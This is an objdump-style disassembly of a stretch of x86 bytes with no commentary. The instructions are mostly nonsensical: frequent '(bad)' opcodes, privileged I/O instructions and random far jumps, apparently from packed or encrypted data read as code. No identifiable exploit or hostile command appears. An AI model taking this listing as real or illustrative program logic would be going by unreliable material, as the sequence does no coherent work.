  41b365:	(bad)  
  41b366:	xor    eax,0x2f9e162
  41b36b:	scas   al,BYTE PTR es:[edi]
  41b36c:	add    BYTE PTR gs:[esi-0x60],al
  41b370:	jbe    0x41b30f
  41b372:	push   0xb35f1848
  41b377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b378:	inc    ecx
  41b379:	inc    eax
  41b37a:	cs ss cmp eax,0x4f96b442
  41b381:	outs   dx,DWORD PTR ds:[esi]
  41b382:	dec    esi
  41b383:	sub    eax,0xfada44e0
  41b388:	inc    esp
  41b389:	mov    eax,0x30d5e20d
  41b38e:	jae    0x41b3da
  41b390:	(bad)  
  41b391:	adc    eax,0xd3864e54
  41b396:	mov    al,ds:0xc4c236eb
  41b39b:	pusha  
  41b39c:	fs jl  0x41b3f5
  41b39f:	inc    edx
  41b3a0:	pop    edx
  41b3a1:	fdivr  QWORD PTR [edx-0x68]
  41b3a4:	test   BYTE PTR [edi-0x19],0xdc
  41b3a8:	jg     0x41b422
  41b3aa:	cmp    eax,esp
  41b3ac:	and    eax,0x24622c3d
  41b3b1:	add    esi,0x5e78f760
  41b3b7:	retf   0x2c9b
  41b3ba:	or     ah,BYTE PTR [esi+0x32763933]
  41b3c0:	(bad)  
  41b3c1:	sahf   
  41b3c2:	faddp  st(0),st
  41b3c4:	fisubr WORD PTR [edx+0x4a18e51]
  41b3ca:	int3   
  41b3cb:	adc    edx,DWORD PTR [esi+0x31c1dd4b]
  41b3d1:	enter  0x87b8,0x48
  41b3d5:	inc    ebx
  41b3d6:	sti    
  41b3d7:	(bad)  
  41b3d8:	xor    al,0x63
  41b3da:	xor    eax,0xfcf29e1a
  41b3df:	out    0xf3,eax
  41b3e1:	mov    esp,0xd985a49b
  41b3e6:	lahf   
  41b3e7:	push   ss
  41b3e8:	out    0xa4,eax
  41b3ea:	jns    0x41b440
  41b3ec:	xor    esi,ebx
  41b3ee:	jns    0x41b3ba
  41b3f0:	ror    DWORD PTR [ebx+0x6b5ad9cd],0xdb
  41b3f7:	push   edi
  41b3f8:	inc    ebx
  41b3f9:	iret   
  41b3fa:	fdiv   QWORD PTR [esi-0x7e7c7eaa]
  41b400:	dec    edi
  41b401:	call   0x89b08eec
  41b406:	stos   BYTE PTR es:[edi],al
  41b407:	gs sub eax,0x324c904c
  41b40d:	mov    bh,0xa4
  41b40f:	xchg   DWORD PTR [ecx-0x69],ebp
  41b412:	xchg   edx,eax
  41b413:	pop    edi
  41b414:	pop    ecx
  41b415:	mov    edi,0x19cd723a
  41b41a:	mov    ebp,0xcc89ba50
  41b41f:	push   edx
  41b420:	inc    eax
  41b421:	mov    bh,0xc7
  41b423:	scas   eax,DWORD PTR es:[edi]
  41b424:	inc    ebx
  41b425:	in     al,dx
  41b426:	add    BYTE PTR [ebx-0x22],0x56
  41b42a:	sbb    DWORD PTR [edx+edx*8-0x3b],esp
  41b42e:	cs inc ebx
  41b430:	mov    ecx,0x675b93c3
  41b435:	stos   BYTE PTR es:[edi],al
  41b436:	jo     0x41b3ce
  41b438:	test   eax,0x4005c8a7
  41b43d:	popf   
  41b43e:	mov    WORD PTR [esi+0x59ee29f2],?
  41b444:	(bad)  
  41b445:	imul   esp,DWORD PTR [eax-0x2b],0xffffffa9
  41b449:	ds int 0x58
  41b44c:	sub    DWORD PTR [edi],ebx
  41b44e:	sub    DWORD PTR [ecx-0x6d7b9845],ecx
  41b454:	xchg   esp,eax
  41b455:	cli    
  41b456:	imul   edx,DWORD PTR [ecx],0x35
  41b459:	and    eax,0xab45bdb0
  41b45e:	push   edx
  41b45f:	test   BYTE PTR [esi+0x73ef6a47],dl
  41b465:	sbb    cl,BYTE PTR [ebp-0x5f45c8de]
  41b46b:	pop    ss
  41b46c:	push   es
  41b46d:	jmp    0x41b440
  41b46f:	dec    ebx
  41b470:	ret    0x98
  41b473:	scas   al,BYTE PTR es:[edi]
  41b474:	push   ebx
  41b475:	jae    0x41b410
  41b477:	cld    
  41b478:	add    BYTE PTR [eax-0x3390bb6b],al
  41b47e:	push   esp
  41b47f:	cmp    DWORD PTR [esi-0x1a],ebp
  41b482:	dec    edi
  41b483:	call   0x1199e4cb
  41b488:	out    dx,al
  41b489:	ror    ah,1
  41b48b:	out    0xd5,eax
  41b48d:	sbb    bl,dh
  41b48f:	lds    esi,FWORD PTR [edi-0x385a3e0]
  41b495:	mov    ebx,DWORD PTR ds:0x2135ed05
  41b49b:	hlt    
  41b49c:	retf   0xb934
  41b49f:	xor    dl,ah
  41b4a1:	das    
  41b4a2:	popa   
  41b4a3:	lds    esi,FWORD PTR [edx-0x3f1be881]
  41b4a9:	mov    ah,0x9a
  41b4ab:	fdivp  st(2),st
  41b4ad:	in     eax,0xff
  41b4af:	sbb    al,0x8b
  41b4b1:	or     bl,dh
  41b4b3:	sbb    al,0x27
  41b4b5:	pop    es
  41b4b6:	adc    dh,bl
  41b4b8:	pop    ebp
  41b4b9:	mov    edx,0x7dfb0581
  41b4be:	and    ch,dh
  41b4c0:	add    al,0x95
  41b4c2:	loope  0x41b542
  41b4c4:	xchg   edx,eax
  41b4c5:	ret    0x82c8
  41b4c8:	jge    0x41b48e
  41b4ca:	ret    
  41b4cb:	int    0x77
  41b4cd:	sti    
  41b4ce:	dec    esi
  41b4cf:	stos   DWORD PTR es:[edi],eax
  41b4d0:	ret    
  41b4d1:	jo     0x41b4bd
  41b4d3:	leave  
  41b4d4:	(bad)  
  41b4d6:	sub    BYTE PTR [edx-0x4c],0x91
  41b4da:	out    0x6a,eax
  41b4dc:	enter  0x6573,0x4d
  41b4e0:	jmp    0xad6f:0xa97cabe4
  41b4e7:	(bad)  
  41b4e8:	aam    0x19
  41b4ea:	sub    DWORD PTR ds:[ebp+0x7e],ebx
  41b4ee:	sbb    edi,eax
  41b4f0:	lea    eax,[esi-0x62]
  41b4f3:	stc    
  41b4f4:	mov    ds:0xcdda2f17,al
  41b4f9:	cmp    al,0xc0
  41b4fb:	clts   
  41b4fd:	or     esp,ebp
  41b4ff:	bound  esi,QWORD PTR [ebp-0x3e]
  41b502:	adc    ecx,eax
  41b504:	test   BYTE PTR [eax+esi*8-0x22a82dd9],bl
  41b50b:	mov    dl,BYTE PTR [eax+0x7a7c04f9]
  41b511:	fidivr WORD PTR es:[eax-0x5e537ada]
  41b518:	ror    BYTE PTR [ebp-0x586cc849],0x62
  41b51f:	into   
  41b520:	ror    dh,1
  41b522:	rol    DWORD PTR [ecx+0x6a],cl
  41b525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b526:	lods   al,BYTE PTR ds:[esi]
  41b527:	push   esp
  41b528:	sbb    al,0x19
  41b52a:	dec    esi
  41b52b:	add    eax,0xf27b2c28
  41b530:	pop    eax
  41b531:	dec    edi
  41b532:	(bad)  
  41b533:	aad    0x30
  41b535:	cs inc ah
  41b538:	loop   0x41b53f
  41b53a:	mov    ebx,0xf033369e
  41b53f:	dec    edi
  41b540:	sbb    DWORD PTR [ebx+0x6404da9b],edi
  41b546:	(bad)  
  41b548:	mov    esi,0x8171eff
  41b54d:	sbb    bh,BYTE PTR [ebx+0x305f78e5]
  41b553:	mov    dh,0x8d
  41b555:	xlat   BYTE PTR ds:[ebx]
  41b556:	leave  
  41b557:	popf   
  41b558:	mov    edx,0xcee597ae
  41b55d:	jecxz  0x41b537
  41b55f:	call   0x48cc:0x59cdef83
  41b566:	(bad)  
  41b567:	xchg   edx,eax
  41b568:	inc    edx
  41b569:	add    esp,DWORD PTR [eax]
  41b56b:	arpl   WORD PTR [ebp+0xa60ffb],bx
  41b571:	mov    ch,0x57
  41b573:	mov    ecx,0x75d8f959
  41b578:	addr16 xchg ah,dl
  41b57b:	ja     0x41b55a
  41b57d:	and    ecx,DWORD PTR [eax+0x7824bf3]
  41b583:	push   ds
  41b584:	in     al,0x6a
  41b586:	sub    al,0x58
  41b588:	sub    edi,DWORD PTR [eax]
  41b58a:	and    al,0x6
  41b58c:	lea    esp,[esi-0x6beecf5a]
  41b592:	sbb    eax,0x620617e0
  41b597:	push   ecx
  41b598:	xor    al,0xd6
  41b59a:	call   0x46e3b264
  41b59f:	outs   dx,DWORD PTR ds:[esi]
  41b5a0:	inc    ecx
  41b5a1:	inc    ebp
  41b5a2:	jae    0x41b52f
  41b5a4:	cmp    ah,BYTE PTR [eax+0x7328e903]
  41b5aa:	dec    edi
  41b5ab:	lods   eax,DWORD PTR ds:[esi]
  41b5ac:	loope  0x41b5b7
  41b5ae:	xlat   BYTE PTR ds:[ebx]
  41b5af:	jo     0x41b626
  41b5b1:	add    bh,dl
  41b5b3:	mov    esi,0xe8987370
  41b5b8:	cmp    ebp,DWORD PTR [ebp+0x61]
  41b5bb:	push   es
  41b5bc:	das    
  41b5bd:	pop    ecx
  41b5be:	lahf   
  41b5bf:	push   ebp
  41b5c0:	push   DWORD PTR [ebp-0x5b]
  41b5c3:	pop    ecx
  41b5c4:	push   es
  41b5c5:	test   BYTE PTR [esi+0x6],cl
  41b5c8:	std    
  41b5c9:	outs   dx,DWORD PTR ds:[esi]
  41b5ca:	cdq    
  41b5cb:	cmp    eax,DWORD PTR [ebx-0x72]
  41b5ce:	xchg   esi,eax
  41b5cf:	lds    ebx,FWORD PTR [eax-0x2b0bbd9c]
  41b5d5:	pushf  
  41b5d6:	and    al,BYTE PTR [esi+0x3d287a13]
  41b5dc:	adc    esi,DWORD PTR [ecx+edx*2-0x42c13053]
  41b5e3:	push   cs
  41b5e4:	repz mov al,ds:0x11f035da
  41b5ea:	mov    eax,0x93c357b6
  41b5ef:	fnsave [esi]
  41b5f1:	ret    
  41b5f2:	shl    DWORD PTR [ecx*1-0x70220c85],cl
  41b5f9:	mov    al,0x7c
  41b5fb:	mov    ds:0xb9e21f45,eax
  41b600:	jge    0x41b64a
  41b602:	add    BYTE PTR [ebx+0x19],dh
  41b605:	inc    edi
  41b606:	push   0x259eeea
  41b60b:	sar    BYTE PTR [eax+eax*4-0x6bace339],cl
  41b612:	add    BYTE PTR [eax+0x25],bh
  41b615:	mov    ds:0x2535ea5,eax
  41b61a:	ror    DWORD PTR [edi+0x75],1
  41b61d:	jl     0x41b655
  41b61f:	pop    ecx
  41b620:	lahf   
  41b621:	popf   
  41b622:	jb     0x41b698
  41b624:	mov    eax,ds:0x4130eaab
  41b629:	scas   al,BYTE PTR es:[edi]
  41b62a:	test   BYTE PTR [ebx+0x5e],bl
  41b62d:	cdq    
  41b62e:	adc    al,0xdf
  41b630:	xor    bl,BYTE PTR [esi-0xa]
  41b633:	and    bl,bh
  41b635:	mov    eax,eax
  41b637:	and    eax,DWORD PTR [edx]
  41b639:	stos   DWORD PTR es:[edi],eax
  41b63a:	test   al,0xc0
  41b63c:	into   
  41b63d:	push   dx
  41b63f:	and    bl,al
  41b641:	fwait
  41b642:	cld    
  41b643:	stc    
  41b644:	addps  xmm3,XMMWORD PTR [ebx]
  41b647:	jnp    0x41b65f
  41b649:	jmp    0x41b687
  41b64b:	cmp    DWORD PTR [ecx-0x4e],eax
  41b64e:	xor    al,al
  41b650:	cmp    edi,DWORD PTR [eax]
  41b652:	cmc    
  41b653:	pop    ebp
  41b654:	out    0xa5,al
  41b656:	mov    al,0x5b
  41b658:	push   edx
  41b659:	(bad)  
  41b65a:	jp     0x41b6a6
  41b65c:	dec    eax
  41b65d:	stos   BYTE PTR es:[edi],al
  41b65e:	test   al,0xdf
  41b660:	popf   
  41b661:	(bad)
  41b664:	sub    ebp,DWORD PTR [eax-0x71]
  41b667:	into   
  41b668:	push   0x4f
  41b66a:	stos   BYTE PTR es:[edi],al
  41b66b:	iret   
  41b66c:	jae    0x41b67a
  41b66e:	mov    cl,0xac
  41b670:	lock out 0xc0,eax
  41b673:	push   eax
  41b674:	and    al,0x53
  41b676:	mov    al,0x8d
  41b678:	call   0x2274:0x48b92aa0
  41b67f:	stc    
  41b680:	pop    edx
  41b681:	dec    esp
  41b682:	adc    edx,DWORD PTR [edi]
  41b684:	xchg   esi,eax
  41b685:	jbe    0x41b6e5
  41b687:	(bad)  
  41b689:	pusha  
  41b68a:	loopne 0x41b709
  41b68c:	fwait
  41b68d:	cmp    dh,BYTE PTR [ebx+0x64043b56]
  41b693:	fldcw  WORD PTR ds:0x55a51657
  41b699:	(bad)  
  41b69a:	mov    eax,0xd353f782
  41b69f:	cs xchg esi,eax
  41b6a1:	pop    esi
  41b6a2:	mov    ?,edi
  41b6a4:	dec    esi
  41b6a5:	aad    0x36
  41b6a7:	sub    esi,DWORD PTR [ebx-0x65]
  41b6aa:	dec    eax
  41b6ab:	arpl   WORD PTR [esi-0x482b067e],dx
  41b6b1:	leave  
  41b6b2:	add    ebx,esi
  41b6b4:	inc    ebx
  41b6b5:	jl     0x41b70f
  41b6b7:	jb     0x41b737
  41b6b9:	mov    ah,0x8
  41b6bb:	ret    0x4271
  41b6be:	repz add eax,0xcac67952
  41b6c4:	pop    esi
  41b6c5:	daa    
  41b6c6:	mov    ch,0x4c
  41b6c8:	mov    esp,0xde4b4818
  41b6cd:	sub    BYTE PTR [ecx+0x4c],bl
  41b6d0:	adc    al,0x60
  41b6d2:	sbb    al,ah
  41b6d4:	in     eax,0xe3
  41b6d6:	add    DWORD PTR [edi-0x39],ebp
  41b6d9:	and    DWORD PTR [eax-0x7c],edx
  41b6dc:	mov    dl,0x54
  41b6de:	(bad)  
  41b6df:	jb     0x41b74b
  41b6e1:	push   ss
  41b6e2:	add    cl,BYTE PTR [eax-0x4e]
  41b6e5:	out    dx,eax
  41b6e6:	stc    
  41b6e7:	stos   BYTE PTR es:[edi],al
  41b6e8:	jmp    0xcc3:0xd117f9ff
  41b6ef:	mov    dh,0x95
  41b6f1:	push   ebp
  41b6f2:	or     BYTE PTR [eax-0x5f8f2ccc],bl
  41b6f8:	xchg   ebx,eax
  41b6f9:	cdq    
  41b6fa:	mov    eax,0xb3f969a9
  41b6ff:	ret    0x703c
  41b702:	xor    ch,BYTE PTR [edx+0x26]
  41b705:	pushf  
  41b706:	push   cs
  41b707:	xor    ah,al
  41b709:	xchg   ecx,eax
  41b70a:	shr    ebx,cl
  41b70c:	scas   eax,DWORD PTR es:[edi]
  41b70d:	js     0x41b745
  41b70f:	fsub   QWORD PTR [ebp-0x14d39ce2]
  41b715:	stos   DWORD PTR es:[edi],eax
  41b716:	popa   
  41b717:	out    dx,al
  41b718:	fidivr WORD PTR [esi-0x70d985a9]
  41b71e:	outs   dx,DWORD PTR ds:[esi]
  41b71f:	int    0x8f
  41b721:	sahf   
  41b722:	cmp    al,0x65
  41b724:	int3   
  41b725:	jnp    0x41b746
  41b727:	adc    al,0xbd
  41b729:	in     al,dx
  41b72a:	push   es
  41b72b:	mov    ebx,0x78280a8
  41b730:	xchg   esi,eax
  41b731:	sbb    esi,DWORD PTR [ecx]
  41b733:	sub    bl,BYTE PTR [esi]
  41b735:	dec    ebx
  41b736:	dec    esp
  41b737:	mov    WORD PTR [eax+0x6607cbc9],cs
  41b73d:	cmp    esp,eax
  41b73f:	or     BYTE PTR [eax+0x52],ah
  41b742:	aaa    
  41b743:	in     eax,0x58
  41b745:	(bad)  
  41b746:	sbb    DWORD PTR [edx-0x7a],ebx
  41b749:	das    
  41b74a:	inc    ebp
  41b74b:	push   ecx
  41b74c:	push   ss
  41b74d:	sbb    al,0xca
  41b74f:	mov    al,0x12
  41b751:	or     al,0x77
  41b753:	adc    eax,0xf08380f4
  41b758:	das    
  41b759:	mov    esp,0xde14b87a
  41b75e:	mov    cl,0x3c
  41b760:	cmp    al,0x87
  41b762:	sti    
  41b763:	dec    esi
  41b764:	dec    esp
  41b765:	pop    ss
  41b766:	cmp    eax,0x61c9a9eb
  41b76b:	cdq    
  41b76c:	(bad)  
  41b76d:	push   ebx
  41b76e:	mov    edx,0xd5a0b950
  41b773:	loopne 0x41b7aa
  41b775:	sbb    dh,bl
  41b777:	adc    ecx,edx
  41b779:	ret    
  41b77a:	call   0x2dae:0x60156e08
  41b781:	xor    bh,bh
  41b783:	icebp  
  41b784:	xchg   ecx,eax
  41b785:	xchg   DWORD PTR [edx+0x34],ebx
  41b788:	pop    ebx
  41b789:	(bad)  
  41b78a:	cmc    
  41b78b:	dec    BYTE PTR [eax+esi*4-0x13]
  41b78f:	push   edx
  41b790:	enter  0x14bf,0x79
  41b794:	into   
  41b795:	sbb    eax,0xfb10dd4c
  41b79a:	jno    0x41b75d
  41b79c:	rep stos DWORD PTR es:[edi],eax
  41b79e:	nop
  41b79f:	test   BYTE PTR [eax],ch
  41b7a1:	or     bh,BYTE PTR [edi]
  41b7a3:	xor    cl,BYTE PTR [esi]
  41b7a5:	sbb    eax,0x30523dfd
  41b7aa:	or     eax,0x124ca7a
  41b7af:	jns    0x41b828
  41b7b1:	rcl    DWORD PTR [edx],1
  41b7b3:	adc    BYTE PTR [eax+0x2173d30a],bh
  41b7b9:	mov    WORD PTR [eax],ds
  41b7bb:	mov    edi,0xa78813a9
  41b7c0:	dec    esi
  41b7c1:	aam    0x5b
  41b7c3:	sub    esi,DWORD PTR [ecx]
  41b7c5:	mov    dl,0xc1
  41b7c7:	inc    edx
  41b7c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7c9:	xchg   edx,eax
  41b7ca:	aad    0x45
  41b7cc:	sti    
  41b7cd:	sub    al,0x29
  41b7cf:	xchg   DWORD PTR [ecx+0x44],ebp
  41b7d2:	fstp   QWORD PTR [esi]
  41b7d4:	pop    eax
  41b7d5:	or     al,0xc8
  41b7d7:	and    ebx,DWORD PTR [edi]
  41b7d9:	mov    ds:0x64d55221,al
  41b7de:	sub    DWORD PTR [eax-0xfb963c7],ebp
  41b7e4:	int3   
  41b7e5:	fld    TBYTE PTR [eax]
  41b7e7:	dec    esp
  41b7e8:	mov    esp,esp
  41b7ea:	(bad)  
  41b7eb:	leave  
  41b7ec:	mov    esp,0x84132917
  41b7f1:	fiadd  WORD PTR [edi+ecx*4]
  41b7f4:	ins    BYTE PTR es:[edi],dx
  41b7f5:	and    BYTE PTR [edi+edi*8+0x1f49edc3],ch
  41b7fc:	xor    al,0xb1
  41b7fe:	jg     0x41b7be
  41b800:	or     al,0x34
  41b802:	(bad)  
  41b803:	adc    eax,0xa357f64c
  41b808:	mov    ah,0xf6
  41b80a:	inc    ebp
  41b80b:	adc    edi,ecx
  41b80d:	retf   
  41b80e:	inc    eax
  41b80f:	pop    edi
  41b810:	fwait
  41b811:	dec    ebx
  41b812:	inc    ebp
  41b813:	adc    cl,bl
  41b815:	xchg   ebx,eax
  41b816:	mov    ecx,0x37a9cde4
  41b81b:	sar    DWORD PTR [eax-0x5a],1
  41b81e:	popf   
  41b81f:	sub    esp,DWORD PTR [edx+ebp*1]
  41b822:	and    al,0xa4
  41b825:	mov    bl,0xf7
  41b827:	inc    edx
  41b828:	shl    DWORD PTR [edx+0x15],1
  41b82b:	inc    edx
  41b82c:	jg     0x41b858
  41b82e:	sbb    eax,0x43bc0de
  41b833:	and    esi,eax
  41b835:	push   ecx
  41b836:	test   al,0xac
  41b838:	jecxz  0x41b867
  41b83a:	sbb    eax,0x46e3cfcf
  41b83f:	outs   dx,DWORD PTR ds:[esi]
  41b840:	sub    eax,0x7bc382ef
  41b845:	retf   
  41b846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b847:	sbb    dh,BYTE PTR [edi-0xd]
  41b84a:	imul   esi,DWORD PTR [ecx+0x2a],0xffffffb1
  41b84e:	into   
  41b84f:	adc    BYTE PTR [ecx-0x7770655a],al
  41b855:	add    eax,0xdc52fe8d
  41b85a:	mov    eax,0xeac30120
  41b85f:	in     eax,dx
  41b860:	fmul   DWORD PTR [ebx+eax*1+0xa3026df]
  41b867:	fnsave [edi-0xa8ea506]
  41b86d:	mov    DWORD PTR [esp+ebx*4+0x1565da83],edx
  41b874:	jb     0x41b883
  41b876:	push   edi
  41b877:	retf   
  41b878:	push   esp
  41b879:	sar    edx,0xe9
  41b87c:	mov    bh,0x2b
  41b87e:	popf   
  41b87f:	out    dx,al
  41b880:	mov    edi,0xe4f148da
  41b885:	dec    esi
  41b886:	out    0x0,al
  41b888:	sbb    al,0x9d
  41b88a:	fbld   TBYTE PTR [eax+eax*8+0x6b1d439a]
  41b891:	bound  edi,QWORD PTR [edi+0xb]
  41b894:	push   eax
  41b895:	arpl   WORD PTR [ecx+edx*4],bx
  41b898:	inc    esp
  41b899:	pop    ss
  41b89a:	adc    eax,0x372f45b4
  41b89f:	ss add esi,ebp
  41b8a2:	mov    edi,ebp
  41b8a4:	ins    DWORD PTR es:[edi],dx
  41b8a5:	scas   eax,DWORD PTR es:[edi]
  41b8a6:	mov    ds:0xcb0c2818,eax
  41b8ab:	add    eax,0xea2589ca
  41b8b0:	stos   BYTE PTR es:[edi],al
  41b8b1:	xor    edx,DWORD PTR [edx+0x47]
  41b8b4:	(bad)  
  41b8b5:	and    BYTE PTR [eax+0x50],0xef
  41b8b9:	not    DWORD PTR [eax-0x760fe931]
  41b8bf:	(bad)  
  41b8c0:	scas   al,BYTE PTR es:[edi]
  41b8c1:	add    bh,cl
  41b8c3:	mov    al,ds:0xbf97e189
  41b8c8:	add    ecx,edx
  41b8ca:	mov    ebx,0xd6ee2e23
  41b8cf:	xor    eax,0xe4584353
  41b8d4:	out    dx,eax
  41b8d5:	pop    esi
  41b8d6:	(bad)  
  41b8d7:	in     eax,0x24
  41b8d9:	call   0x3cf7:0x971286a0
  41b8e0:	dec    eax
  41b8e1:	add    cl,al
  41b8e3:	out    0xb,eax
  41b8e5:	pop    ss
  41b8e6:	(bad)  
  41b8e7:	cli    
  41b8e8:	inc    eax
  41b8e9:	fwait
  41b8ea:	mov    eax,ds:0xa18c6eef
  41b8ef:	cdq    
  41b8f0:	mov    ebx,edx
  41b8f2:	jge    0x41b882
  41b8f4:	xchg   edi,eax
  41b8f5:	push   esi
  41b8f6:	jne    0x41b91a
  41b8f8:	mov    ah,0x81
  41b8fa:	out    0x79,al
  41b8fc:	dec    eax
  41b8fd:	and    al,0xc8
  41b8ff:	mov    bl,0x57
  41b901:	(bad)  
  41b902:	jmp    0x5435:0x869ffcd7
  41b909:	adc    ecx,DWORD PTR [edi+0x5094f52]
  41b90f:	cmp    al,0xb7
  41b911:	cmp    BYTE PTR [ebx-0x3d],0x1d
  41b915:	out    0xfa,eax
  41b917:	pop    es
  41b918:	pushf  
  41b919:	lahf   
  41b91a:	imul   esp,eax,0x6efa3d9d
  41b920:	fs repnz xchg edx,eax
  41b923:	jge    0x41b99d
  41b925:	cmp    edx,DWORD PTR cs:0x78e6d42f
  41b92c:	fsubr  st(5),st
  41b92e:	cdq    
  41b92f:	inc    esi
  41b930:	mov    bh,0xbb
  41b932:	jge    0x41b8f8
  41b934:	or     ebp,DWORD PTR [eax]
  41b936:	fistp  QWORD PTR [eax]
  41b938:	imul   esi,DWORD PTR [ecx-0x13],0xd025ef42
  41b93f:	mov    edx,0xc77f99af
  41b944:	sti    
  41b945:	in     eax,0xc6
  41b947:	mov    ch,0x7
  41b949:	mov    ebp,0xa13b969a
  41b94e:	push   esp
  41b94f:	outs   dx,BYTE PTR ds:[esi]
  41b950:	sbb    eax,0x3701eea9
  41b955:	cmp    eax,0x44f709f2
  41b95a:	push   0x74
  41b95c:	xor    bh,BYTE PTR [ecx+0x3a]
  41b95f:	sti    
  41b960:	cwde   
  41b961:	pop    ecx
  41b962:	ret    
  41b963:	in     eax,0xf9
  41b965:	adc    eax,0xdb611d1b
  41b96a:	int    0xcf
  41b96c:	cmp    DWORD PTR [edi-0x6a],ebx
  41b96f:	and    ah,BYTE PTR [edx+0x24]
  41b972:	fist   DWORD PTR [esi-0x5c]
  41b975:	jmp    0x8d5d:0xf91f5919
  41b97c:	gs pop ss
  41b97e:	test   DWORD PTR [esi+edx*2-0x7d997578],0xf96d8f4a
  41b989:	loope  0x41b9ee
  41b98b:	ret    
  41b98c:	enter  0xd7e5,0x87
  41b990:	cmp    DWORD PTR es:[edi+0x62d69a6f],edi
  41b997:	xchg   esi,eax
  41b998:	and    edx,DWORD PTR [edx+0x3d]
  41b99b:	out    0x6c,al
  41b99d:	mov    dl,0xe0
  41b99f:	outs   dx,DWORD PTR ds:[esi]
  41b9a0:	je     0x41b955
  41b9a2:	aas    
  41b9a3:	pushf  
  41b9a4:	cmp    eax,0xca0aaffa
  41b9a9:	ins    BYTE PTR es:[edi],dx
  41b9aa:	das    
  41b9ab:	repz or edi,eax
  41b9ae:	pop    esi
  41b9af:	adc    al,0x78
  41b9b1:	jp     0x41b9cd
  41b9b3:	push   ebp
  41b9b4:	rol    BYTE PTR [edx+0x6d],1
  41b9b7:	or     edx,DWORD PTR [edx+0x5b143952]
  41b9bd:	mov    ebp,0xe1790f82
  41b9c2:	cmc    
  41b9c3:	out    dx,al
  41b9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9c5:	cmp    DWORD PTR [ecx-0x28cb61af],eax
  41b9cb:	cdq    
  41b9cc:	loope  0x41ba1f
  41b9ce:	mov    ecx,0xbe3fb9e2
  41b9d3:	jp     0x41b973
  41b9d5:	xchg   BYTE PTR [ebp+0x525b0501],ah
  41b9db:	xchg   ebp,eax
  41b9dc:	jle    0x41b9a4
  41b9de:	fcomi  st,st(7)
  41b9e0:	and    esp,edi
  41b9e2:	scas   eax,DWORD PTR es:[edi]
  41b9e3:	mov    ebx,0x3bd69a1e
  41b9e8:	add    eax,0x5b9992be
  41b9ed:	push   edi
  41b9ee:	cwde   
  41b9ef:	fimul  DWORD PTR [ecx+0x59]
  41b9f2:	and    al,0xf8
  41b9f4:	jle    0x41ba1e
  41b9f6:	stc    
  41b9f7:	pop    edi
  41b9f8:	and    ch,bl
  41b9fa:	je     0x41ba3a
  41b9fc:	gs dec esi
  41b9fe:	inc    esp
  41b9ff:	loopne 0x41ba4f
  41ba01:	stc    
  41ba02:	in     eax,0xfc
  41ba04:	dec    ecx
  41ba05:	imul   esi,DWORD PTR [edx-0x392bf95d],0x5cf1417f
  41ba0f:	mov    esi,0x8d85f2a3
  41ba14:	sbb    al,0xe3
  41ba16:	lods   eax,DWORD PTR ds:[esi]
  41ba17:	xchg   ecx,eax
  41ba18:	mov    ds:0xfcd70978,eax
  41ba1d:	frstor [edi-0x4a0674e7]
  41ba23:	mov    al,ds:0xabdf8d58
  41ba28:	leave  
  41ba29:	pop    edx
  41ba2a:	sbb    DWORD PTR [esi],edi
  41ba2c:	mov    ds:0x4e79a12f,eax
  41ba31:	add    ebp,eax
  41ba33:	xchg   edi,eax
  41ba34:	call   0x7025:0x46946f1e
  41ba3b:	xchg   DWORD PTR [esp+edx*4],esi
  41ba3e:	jecxz  0x41ba91
  41ba40:	fwait
  41ba41:	loopne 0x41ba21
  41ba43:	lock pop ebx
  41ba45:	push   ss
  41ba46:	add    BYTE PTR [esi-0x1e],al
  41ba49:	sahf   
  41ba4a:	mov    WORD PTR [ecx-0xa],cs
  41ba4d:	push   ecx
  41ba4e:	xor    al,0x11
  41ba50:	test   BYTE PTR [ebx+esi*2],cl
  41ba53:	cli    
  41ba54:	mov    eax,0x6f7424f3
  41ba59:	xor    al,0x1c
  41ba5b:	sbb    al,0xed
  41ba5d:	sub    eax,0x1c37751d
  41ba62:	or     eax,0xe3000227
  41ba67:	sub    BYTE PTR [esi+0x65],ah
  41ba6a:	repz mov edx,0x822c6103
  41ba70:	dec    ebp
  41ba71:	dec    eax
  41ba72:	pop    ecx
  41ba73:	jecxz  0x41baac
  41ba75:	leave  
  41ba76:	sub    edi,ebp
  41ba78:	xor    bh,BYTE PTR [eax-0x6c]
  41ba7b:	pop    edx
  41ba7c:	sbb    DWORD PTR [eax+edx*8],eax
  41ba7f:	shl    ebp,cl
  41ba81:	nop
  41ba82:	sub    eax,0xbbdd0def
  41ba87:	and    eax,0x11b3c351
  41ba8c:	clc    
  41ba8d:	fneni(8087 only) 
  41ba8f:	sub    DWORD PTR [edx-0x5370ee31],0xffffffe6
  41ba96:	cmp    DWORD PTR [edi+0x1fb8866e],edi
  41ba9c:	rcr    dh,1
  41ba9e:	ins    BYTE PTR es:[edi],dx
  41ba9f:	add    eax,edi
  41baa1:	cmp    al,0xc4
  41baa3:	psrlq  mm1,QWORD PTR [ecx+edi*2-0x30]
  41baa8:	(bad)  
  41baa9:	xchg   ebp,eax
  41baaa:	imul   sp,WORD PTR [ecx+0x29],0x7d93
  41bab0:	outs   dx,BYTE PTR ds:[esi]
  41bab1:	mov    esi,0xaacb93b1
  41bab6:	adc    ch,bl
  41bab8:	mov    ebp,0xfe1b916f
  41babd:	and    DWORD PTR [eax+0x74c14746],esi
  41bac3:	jge    0x41ba50
  41bac5:	jmp    0x41baf2
  41bac7:	and    eax,0x667b5e07
  41bacc:	arpl   WORD PTR [ecx],bp
  41bace:	push   esi
  41bacf:	inc    edi
  41bad0:	test   eax,0x6187f062
  41bad5:	aam    0xf0
  41bad7:	(bad)  
  41bad8:	fstp   QWORD PTR [edi+0x1b]
  41badb:	push   esp
  41badc:	dec    edx
  41badd:	or     eax,0x9bf1c0a3
  41bae2:	dec    edi
  41bae3:	mov    ebp,0x4b333ad8
  41bae8:	shl    cl,cl
  41baea:	sbb    eax,0x19bb8d28
  41baef:	pusha  
  41baf0:	icebp  
  41baf1:	sbb    eax,0x7a801b4c
  41baf6:	push   edx
  41baf7:	mov    WORD PTR [esp+ecx*2-0x565f3a4f],es
  41bafe:	xchg   edi,eax
  41baff:	out    0xd,eax
  41bb01:	cs test ah,ch
  41bb04:	or     DWORD PTR [esi],0x95392544
  41bb0a:	out    0x62,al
  41bb0c:	add    bl,BYTE PTR [ecx+0x50]
  41bb0f:	fst    st(5)
  41bb11:	sub    bl,0x7b
  41bb14:	mov    ds,ebx
